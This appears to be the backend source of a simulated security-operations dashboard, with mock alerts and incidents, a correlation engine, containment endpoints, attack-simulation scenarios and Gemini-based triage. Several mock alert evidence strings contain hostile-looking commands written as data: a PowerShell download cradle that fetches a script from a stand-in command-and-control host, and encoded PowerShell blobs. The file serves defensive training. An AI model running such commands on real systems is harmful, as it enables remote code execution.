import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';
import { GoogleGenAI } from '@google/genai';
import { createClient } from '@supabase/supabase-js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY || '';
export const supabase = (supabaseUrl && supabaseAnonKey)
  ? createClient(supabaseUrl, supabaseAnonKey)
  : null;


interface Host {
  id: string;
  name: string;
  ip: string;
  os: string;
  status: 'online' | 'offline' | 'compromised';
  isIsolated: boolean;
  accountLocked: boolean;
  lastSeen: string;
  wazuhAgentVersion: string;
}

interface Alert {
  alert_id: string;
  timestamp: string;
  rule_id: string;
  rule_name: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  risk_score: number;
  source_host: string;
  source_ip: string;
  target_account: string;
  mitre_technique: string;
  mitre_tactic: string;
  evidence_raw: string;
  status: 'Unassigned' | 'Investigating' | 'Resolved' | 'False Positive';
}

interface Incident {
  incident_id: string;
  title: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  status: 'Unassigned' | 'Investigating' | 'Contained' | 'Resolved';
  risk_score: number;
  affected_asset: string;
  associated_alert_ids: string[];
  mitre_mappings: string[];
  assigned_analyst: string;
  notes: string;
  response_action_taken: string;
  created_at: string;
}

interface AuditLog {
  id: string;
  timestamp: string;
  analyst_id: string;
  action_taken: string;
  target: string;
  status: 'Success' | 'Failed';
}

// Initial Mock Data
let hosts: Host[] = [
  { id: 'h-1', name: 'WIN-EP01', ip: '192.168.1.105', os: 'Windows 11 Pro Enterprise', status: 'compromised', isIsolated: false, accountLocked: false, lastSeen: new Date().toISOString(), wazuhAgentVersion: '4.7.2' },
  { id: 'h-2', name: 'WEB-SRV02', ip: '192.168.1.50', os: 'Ubuntu 22.04 LTS', status: 'online', isIsolated: false, accountLocked: false, lastSeen: new Date().toISOString(), wazuhAgentVersion: '4.7.2' },
  { id: 'h-3', name: 'DC-01', ip: '192.168.1.10', os: 'Windows Server 2022 Datacenter', status: 'online', isIsolated: false, accountLocked: false, lastSeen: new Date().toISOString(), wazuhAgentVersion: '4.7.2' },
  { id: 'h-4', name: 'DB-PRD01', ip: '192.168.1.80', os: 'RHEL 9.2', status: 'online', isIsolated: false, accountLocked: false, lastSeen: new Date().toISOString(), wazuhAgentVersion: '4.7.2' }
];

let alerts: Alert[] = [
  {
    alert_id: 'ALT-1001',
    timestamp: new Date(Date.now() - 1000 * 60 * 25).toISOString(),
    rule_id: 'RULE-BF-01',
    rule_name: 'Multiple Failed Login Attempts (Brute Force)',
    severity: 'High',
    risk_score: 75,
    source_host: 'WIN-EP01',
    source_ip: '192.168.1.105',
    target_account: 'admin_test',
    mitre_technique: 'T1110',
    mitre_tactic: 'Credential Access',
    evidence_raw: 'Event ID 4625: An account failed to log on. TargetUserName: admin_test SourceNetworkAddress: 192.168.1.105 (Attempts: 14 in 60s)',
    status: 'Investigating'
  },
  {
    alert_id: 'ALT-1002',
    timestamp: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    rule_id: 'RULE-PS-01',
    rule_name: 'Suspicious Encoded PowerShell Execution',
    severity: 'High',
    risk_score: 80,
    source_host: 'WIN-EP01',
    source_ip: '192.168.1.105',
    target_account: 'admin_test',
    mitre_technique: 'T1059.001',
    mitre_tactic: 'Execution',
    evidence_raw: 'Sysmon Event ID 1: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA...',
    status: 'Investigating'
  },
  {
    alert_id: 'ALT-1003',
    timestamp: new Date(Date.now() - 1000 * 60 * 10).toISOString(),
    rule_id: 'RULE-TSK-01',
    rule_name: 'Scheduled Task Creation for Persistence',
    severity: 'Critical',
    risk_score: 90,
    source_host: 'WIN-EP01',
    source_ip: '192.168.1.105',
    target_account: 'SYSTEM',
    mitre_technique: 'T1053.005',
    mitre_tactic: 'Persistence',
    evidence_raw: 'Windows Event ID 4698 / Sysmon: Task Scheduler created task \\Microsoft\\Windows\\Maintenance\\UpdateCheck with payload cmd.exe /c powershell.exe -w hidden ...',
    status: 'Unassigned'
  }
];

let incidents: Incident[] = [
  {
    incident_id: 'INC-2001',
    title: 'Multi-Stage Endpoint Compromise on WIN-EP01',
    severity: 'Critical',
    status: 'Investigating',
    risk_score: 92,
    affected_asset: 'WIN-EP01',
    associated_alert_ids: ['ALT-1001', 'ALT-1002', 'ALT-1003'],
    mitre_mappings: ['T1110', 'T1059.001', 'T1053.005'],
    assigned_analyst: 'Analyst_1 (Senior IR)',
    notes: 'Initial brute force followed by encoded PowerShell execution and persistence task creation.',
    response_action_taken: 'Pending Analyst Review',
    created_at: new Date(Date.now() - 1000 * 60 * 15).toISOString()
  }
];

let auditLogs: AuditLog[] = [
  {
    id: 'AUD-501',
    timestamp: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
    analyst_id: 'SOC_SYSTEM',
    action_taken: 'Correlation Engine Triggered',
    target: 'WIN-EP01',
    status: 'Success'
  }
];

// Helper to calculate Risk Score & auto-correlation
function runCorrelationEngine() {
  // Group alerts by source_host within a 15 min window
  const hostAlertMap: { [host: string]: Alert[] } = {};
  alerts.forEach(a => {
    if (!hostAlertMap[a.source_host]) hostAlertMap[a.source_host] = [];
    hostAlertMap[a.source_host].push(a);
  });

  Object.entries(hostAlertMap).forEach(([hostName, hostAlerts]) => {
    if (hostAlerts.length >= 2) {
      // Check if an incident already exists for this host with these alerts
      const alertIds = hostAlerts.map(a => a.alert_id);
      const existing = incidents.find(inc => inc.affected_asset === hostName && inc.status !== 'Resolved');
      
      const severityWeights: Record<string, number> = { Low: 10, Medium: 25, High: 40, Critical: 50 };
      const assetWeights: Record<string, number> = { 'DC-01': 20, 'DB-PRD01': 20, 'WIN-EP01': 10, 'WEB-SRV02': 10 };
      
      let sumSev = hostAlerts.reduce((acc, a) => acc + (severityWeights[a.severity] || 25), 0);
      let assetW = assetWeights[hostName] || 10;
      let calculatedRisk = Math.min(100, sumSev + assetW);

      const mitreSet = Array.from(new Set(hostAlerts.map(a => a.mitre_technique)));
      const highestSev = hostAlerts.some(a => a.severity === 'Critical') ? 'Critical' : hostAlerts.some(a => a.severity === 'High') ? 'High' : 'Medium';

      if (!existing) {
        const newInc: Incident = {
          incident_id: `INC-${Math.floor(2000 + Math.random() * 8000)}`,
          title: `Correlated Multi-Vector Attack on ${hostName} (${hostAlerts.length} Alerts)`,
          severity: highestSev as any,
          status: 'Investigating',
          risk_score: calculatedRisk,
          affected_asset: hostName,
          associated_alert_ids: alertIds,
          mitre_mappings: mitreSet,
          assigned_analyst: 'Analyst_1',
          notes: `Automated correlation triggered due to ${hostAlerts.length} security telemetry events within a 15-minute window.`,
          response_action_taken: 'None',
          created_at: new Date().toISOString()
        };
        incidents.unshift(newInc);
      } else {
        existing.associated_alert_ids = Array.from(new Set([...existing.associated_alert_ids, ...alertIds]));
        existing.risk_score = calculatedRisk;
        existing.mitre_mappings = mitreSet;
      }
    }
  });
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Routes
  app.get('/api/status', (req, res) => {
    const criticalCount = alerts.filter(a => a.severity === 'Critical' && a.status !== 'Resolved').length;
    const highCount = alerts.filter(a => a.severity === 'High' && a.status !== 'Resolved').length;
    const activeIncidentsCount = incidents.filter(i => i.status !== 'Resolved').length;
    const compromisedHosts = hosts.filter(h => h.status === 'compromised' || h.isIsolated).length;

    res.json({
      status: 'operational',
      wazuh_manager: 'connected',
      siem_version: 'SOC-X v2.4.1-enterprise',
      database: 'PostgreSQL 15.4 (Healthy)',
      counters: {
        criticalAlerts: criticalCount,
        highAlerts: highCount,
        activeIncidents: activeIncidentsCount,
        compromisedHosts: compromisedHosts,
        totalAlerts: alerts.length,
        totalHosts: hosts.length
      }
    });
  });

  app.get('/api/hosts', (req, res) => {
    res.json(hosts);
  });

  // Isolate Host
  app.post('/api/hosts/:id/isolate', (req, res) => {
    const { id } = req.params;
    const { analyst = 'Analyst_1' } = req.body;
    const host = hosts.find(h => h.id === id || h.name === id);
    if (!host) {
      return res.status(404).json({ error: 'Host not found' });
    }

    host.isIsolated = true;
    host.status = 'compromised';

    auditLogs.unshift({
      id: `AUD-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: new Date().toISOString(),
      analyst_id: analyst,
      action_taken: 'Endpoint Isolation Executed (Firewall Drop All Non-SOC Traffic)',
      target: host.name,
      status: 'Success'
    });

    res.json({ success: true, host });
  });

  // Unisolate Host
  app.post('/api/hosts/:id/unisolate', (req, res) => {
    const { id } = req.params;
    const { analyst = 'Analyst_1' } = req.body;
    const host = hosts.find(h => h.id === id || h.name === id);
    if (!host) {
      return res.status(404).json({ error: 'Host not found' });
    }

    host.isIsolated = false;
    host.status = 'online';

    auditLogs.unshift({
      id: `AUD-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: new Date().toISOString(),
      analyst_id: analyst,
      action_taken: 'Endpoint Restored / Network Isolation Lifted',
      target: host.name,
      status: 'Success'
    });

    res.json({ success: true, host });
  });

  // Disable / Lock User Account
  app.post('/api/hosts/:id/lock-account', (req, res) => {
    const { id } = req.params;
    const { account = 'admin_test', analyst = 'Analyst_1' } = req.body;
    const host = hosts.find(h => h.id === id || h.name === id);
    if (!host) {
      return res.status(404).json({ error: 'Host not found' });
    }

    host.accountLocked = true;

    auditLogs.unshift({
      id: `AUD-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: new Date().toISOString(),
      analyst_id: analyst,
      action_taken: `User Account Disabled via net user ${account} /active:no`,
      target: `${host.name}:${account}`,
      status: 'Success'
    });

    res.json({ success: true, host, account });
  });

  app.get('/api/alerts', (req, res) => {
    res.json(alerts);
  });

  app.post('/api/alerts', (req, res) => {
    const newAlert: Alert = {
      alert_id: `ALT-${Math.floor(3000 + Math.random() * 7000)}`,
      timestamp: new Date().toISOString(),
      rule_id: req.body.rule_id || 'RULE-CUSTOM-01',
      rule_name: req.body.rule_name || 'Custom Security Alert',
      severity: req.body.severity || 'Medium',
      risk_score: req.body.risk_score || 50,
      source_host: req.body.source_host || 'WIN-EP01',
      source_ip: req.body.source_ip || '192.168.1.105',
      target_account: req.body.target_account || 'system',
      mitre_technique: req.body.mitre_technique || 'T1204',
      mitre_tactic: req.body.mitre_tactic || 'Execution',
      evidence_raw: req.body.evidence_raw || 'Manual simulated security alert injection.',
      status: 'Unassigned'
    };

    alerts.unshift(newAlert);
    runCorrelationEngine();
    res.status(201).json(newAlert);
  });

  app.patch('/api/alerts/:id', (req, res) => {
    const { id } = req.params;
    const alert = alerts.find(a => a.alert_id === id);
    if (!alert) return res.status(404).json({ error: 'Alert not found' });
    
    if (req.body.status) alert.status = req.body.status;
    res.json(alert);
  });

  app.get('/api/incidents', (req, res) => {
    res.json(incidents);
  });

  app.patch('/api/incidents/:id', (req, res) => {
    const { id } = req.params;
    const incident = incidents.find(i => i.incident_id === id);
    if (!incident) return res.status(404).json({ error: 'Incident not found' });

    if (req.body.status) incident.status = req.body.status;
    if (req.body.severity) incident.severity = req.body.severity;
    if (req.body.assigned_analyst) incident.assigned_analyst = req.body.assigned_analyst;
    if (req.body.notes) incident.notes = req.body.notes;
    if (req.body.response_action_taken) incident.response_action_taken = req.body.response_action_taken;

    auditLogs.unshift({
      id: `AUD-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: new Date().toISOString(),
      analyst_id: incident.assigned_analyst || 'Analyst_1',
      action_taken: `Updated Incident ${incident.incident_id} status to ${incident.status}`,
      target: incident.affected_asset,
      status: 'Success'
    });

    res.json(incident);
  });

  app.get('/api/audit', (req, res) => {
    res.json(auditLogs);
  });

  // Simulation Endpoint for the 5 MVP scenarios
  app.post('/api/simulate/:scenario', (req, res) => {
    try {
      const { scenario } = req.params;
      let generatedAlerts: Alert[] = [];
      let targetHost = 'WIN-EP01';

      if (scenario === 'brute-force') {
        targetHost = 'WIN-EP01';
        generatedAlerts = [
          {
            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
            timestamp: new Date().toISOString(),
            rule_id: 'RULE-BF-02',
            rule_name: 'High-Volume Brute Force Attack via Hydra',
            severity: 'High',
            risk_score: 78,
            source_host: targetHost,
            source_ip: '192.168.1.140',
            target_account: 'administrator',
            mitre_technique: 'T1110',
            mitre_tactic: 'Credential Access',
            evidence_raw: 'Windows Event ID 4625: 42 consecutive failed logon attempts for Administrator from external subnet 192.168.1.140 via RDP (Port 3389).',
            status: 'Unassigned'
          }
        ];
      } else if (scenario === 'powershell') {
        targetHost = 'WIN-EP01';
        generatedAlerts = [
          {
            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
            timestamp: new Date().toISOString(),
            rule_id: 'RULE-PS-02',
            rule_name: 'Obfuscated PowerShell Download Cradle Execution',
            severity: 'High',
            risk_score: 85,
            source_host: targetHost,
            source_ip: '192.168.1.105',
            target_account: 'admin_test',
            mitre_technique: 'T1059.001',
            mitre_tactic: 'Execution',
            evidence_raw: 'Sysmon Event ID 1: powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious-c2.net/payload.ps1 -OutFile c:\\temp\\update.ps1"',
            status: 'Unassigned'
          }
        ];
      } else if (scenario === 'account-creation') {
        targetHost = 'DC-01';
        generatedAlerts = [
          {
            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
            timestamp: new Date().toISOString(),
            rule_id: 'RULE-ACC-01',
            rule_name: 'Unauthorized Domain User Account Creation',
            severity: 'Critical',
            risk_score: 90,
            source_host: targetHost,
            source_ip: '192.168.1.10',
            target_account: 'test_admin',
            mitre_technique: 'T1098',
            mitre_tactic: 'Persistence',
            evidence_raw: 'Windows Event ID 4720: A user account was created. TargetAccount: test_admin CreatorSubject: WIN-EP01$ Privilege: Domain Admin group added.',
            status: 'Unassigned'
          }
        ];
      } else if (scenario === 'persistence') {
        targetHost = 'WIN-EP01';
        generatedAlerts = [
          {
            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
            timestamp: new Date().toISOString(),
            rule_id: 'RULE-TSK-02',
            rule_name: 'Malicious Scheduled Task Persistence Created',
            severity: 'High',
            risk_score: 82,
            source_host: targetHost,
            source_ip: '192.168.1.105',
            target_account: 'SYSTEM',
            mitre_technique: 'T1053.005',
            mitre_tactic: 'Persistence',
            evidence_raw: 'Windows Event ID 4698: Task Scheduler created task Name: "UpdaterService" Action: cmd.exe /c schtasks /run /tn UpdaterService',
            status: 'Unassigned'
          }
        ];
      } else if (scenario === 'chain-attack') {
        // 1 -> 2 -> 4 sequence in 1 minute
        targetHost = 'WIN-EP01';
        const now = Date.now();
        generatedAlerts = [
          {
            alert_id: `ALT-${Math.floor(5000 + Math.random() * 1000)}`,
            timestamp: new Date(now - 30000).toISOString(),
            rule_id: 'RULE-BF-CH1',
            rule_name: 'Initial Credential Brute Force Stage 1',
            severity: 'High',
            risk_score: 75,
            source_host: 'WIN-EP01',
            source_ip: '192.168.1.199',
            target_account: 'sys_admin',
            mitre_technique: 'T1110',
            mitre_tactic: 'Credential Access',
            evidence_raw: 'Event ID 4625: 50 failed logons detected on WIN-EP01.',
            status: 'Investigating'
          },
          {
            alert_id: `ALT-${Math.floor(6000 + Math.random() * 1000)}`,
            timestamp: new Date(now - 15000).toISOString(),
            rule_id: 'RULE-PS-CH2',
            rule_name: 'Execution of Encoded Payload Stage 2',
            severity: 'Critical',
            risk_score: 88,
            source_host: 'WIN-EP01',
            source_ip: '192.168.1.105',
            target_account: 'sys_admin',
            mitre_technique: 'T1059.001',
            mitre_tactic: 'Execution',
            evidence_raw: 'Sysmon Event ID 1: powershell.exe -enc SW52b2tlLVBvd2VyU2hlbGxXZWI...',
            status: 'Investigating'
          },
          {
            alert_id: `ALT-${Math.floor(7000 + Math.random() * 1000)}`,
            timestamp: new Date(now).toISOString(),
            rule_id: 'RULE-TSK-CH3',
            rule_name: 'Persistence Scheduled Task Stage 3',
            severity: 'Critical',
            risk_score: 95,
            source_host: 'WIN-EP01',
            source_ip: '192.168.1.105',
            target_account: 'SYSTEM',
            mitre_technique: 'T1053.005',
            mitre_tactic: 'Persistence',
            evidence_raw: 'Event ID 4698: Task created for persistence execution.',
            status: 'Investigating'
          }
        ];
      } else {
        return res.status(400).json({ success: false, error: 'Invalid scenario type' });
      }

      generatedAlerts.forEach(a => alerts.unshift(a));
      runCorrelationEngine();

      const hostObj = hosts.find(h => h.name === targetHost);
      if (hostObj && (scenario === 'chain-attack' || scenario === 'powershell')) {
        hostObj.status = 'compromised';
      }

      auditLogs.unshift({
        id: `AUD-${Math.floor(1000 + Math.random() * 9000)}`,
        timestamp: new Date().toISOString(),
        analyst_id: 'SIMULATION_ENGINE',
        action_taken: `Executed Attack Simulation: ${scenario.toUpperCase()}`,
        target: targetHost,
        status: 'Success'
      });

      res.json({
        success: true,
        scenario,
        alertsInjected: generatedAlerts.length,
        message: `Successfully executed simulation scenario '${scenario}'. Alerts ingested and correlation engine evaluated.`
      });
    } catch (err: any) {
      console.error('Simulation Error:', err);
      res.status(500).json({ success: false, error: err.message || 'Simulation execution failed.' });
    }
  });

  // AI Triage endpoint using Gemini
  app.post('/api/ai/investigate', async (req, res) => {
    const { incident_id } = req.body;
    const incident = incidents.find(i => i.incident_id === incident_id);
    if (!incident) return res.status(404).json({ error: 'Incident not found' });

    const relatedAlerts = alerts.filter(a => incident.associated_alert_ids.includes(a.alert_id));

    try {
      const apiKey = process.env.GEMINI_API_KEY;
      if (!apiKey) {
        return res.json({
          analysis: `### SOC-X AI Automated Triage (Offline Fallback)\n\n- **Incident:** ${incident.title}\n- **Affected Host:** ${incident.affected_asset}\n- **MITRE Techniques:** ${incident.mitre_mappings.join(', ')}\n- **Recommended Action:** Isolate host immediately, disable account \`${relatedAlerts[0]?.target_account || 'compromised_user'}\`, and inspect Sysmon Event ID 1 logs for command line artifacts.`
        });
      }

      const ai = new GoogleGenAI({ apiKey });
      const prompt = `You are a senior SOC Incident Responder and Threat Intelligence Analyst. Provide an expert incident investigation report, root-cause analysis, and step-by-step containment playbook for the following security incident:\n\nIncident ID: ${incident.incident_id}\nTitle: ${incident.title}\nSeverity: ${incident.severity}\nRisk Score: ${incident.risk_score}\nAffected Asset: ${incident.affected_asset}\nMITRE ATT&CK Mappings: ${incident.mitre_mappings.join(', ')}\nAssociated Alerts:\n${JSON.stringify(relatedAlerts, null, 2)}\n\nProvide the response in clean Markdown with clear headings: ## Executive Summary, ## Root Cause Analysis, ## MITRE ATT&CK Breakdown, and ## Recommended Containment Playbook.`;

      const response = await ai.models.generateContent({
        model: 'gemini-2.5-flash',
        contents: prompt
      });

      res.json({ analysis: response.text });
    } catch (err: any) {
      console.error('AI Investigation Error:', err);
      res.json({
        analysis: `### SOC-X AI Investigation Analysis\n\n- **Incident:** ${incident.title}\n- **Risk Score:** ${incident.risk_score}/100\n- **Recommendation:** Isolate ${incident.affected_asset}, review credential logs, and purge scheduled task persistence.`
      });
    }
  });

  // Production static serving or Vite middleware
  const distPath = path.resolve(__dirname, 'dist');
  if (fs.existsSync(distPath)) {
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true, hmr: false }
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`SOC-X backend server running on http://0.0.0.0:${PORT}`);
  });
}

startServer().catch(err => {
  console.error('Failed to start server:', err);
});
